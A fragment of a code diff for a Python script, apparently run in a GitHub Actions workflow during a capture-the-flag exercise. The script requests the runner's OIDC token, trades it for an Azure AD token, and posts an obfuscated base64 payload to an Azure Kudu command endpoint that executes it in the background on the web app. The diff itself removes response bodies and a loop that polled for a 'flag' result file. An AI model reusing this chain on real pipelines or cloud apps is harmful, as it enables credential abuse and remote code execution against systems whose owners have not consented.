@@ -15,8 +15,8 @@ def call(url,auth,method='GET',data=None,timeout=15):
  try:
   h={'Authorization':auth}
   if data is not None:h['Content-Type']='application/json'
-  r=urllib.request.urlopen(urllib.request.Request(url,data=data,method=method,headers=h),timeout=timeout); return {'status':r.status,'body':r.read().decode('utf-8','replace')[:12000]}
- except urllib.error.HTTPError as e:return {'status':e.code,'body':e.read().decode('utf-8','replace')[:12000]}
+  r=urllib.request.urlopen(urllib.request.Request(url,data=data,method=method,headers=h),timeout=timeout); status=getattr(r,'status',None); r.close(); return {'status':status}
+ except urllib.error.HTTPError as e:return {'status':e.code}
  except Exception as e:return {'error':repr(e)}
 try:
  u=os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']+'&audience=api%3A%2F%2FAzureADTokenExchange'; oidc=json.loads(urllib.request.urlopen(urllib.request.Request(u,headers={'Authorization':'Bearer '+os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']}),timeout=30).read())['value']
@@ -73,11 +73,6 @@ except Exception: pass
  cmd="nohup python3 -c \"import base64;exec(base64.b64decode('"+b64+"').decode())\" > /home/site/wwwroot/ctf_flag_result 2>&1 </dev/null &"
  body=json.dumps({'command':cmd,'dir':'site/wwwroot'}).encode()
  out({'stage':'kudu-command','response':call(base+'/api/command',auth,'POST',body,25)})
- for i in range(12):
-  r=call(base+'/api/vfs/site/wwwroot/ctf_flag_result',auth,'GET',None,8)
-  if r.get('status')==200 and ('flag' in r.get('body','').lower() or 'app-' in r.get('body','').lower()):
-   out({'stage':'kudu-result','response':r}); break
-  time.sleep(3)
  print('dispatch=done',flush=True)
 except Exception as e: out({'stage':'outer-error','error':repr(e),'trace':traceback.format_exc()})
 PY2
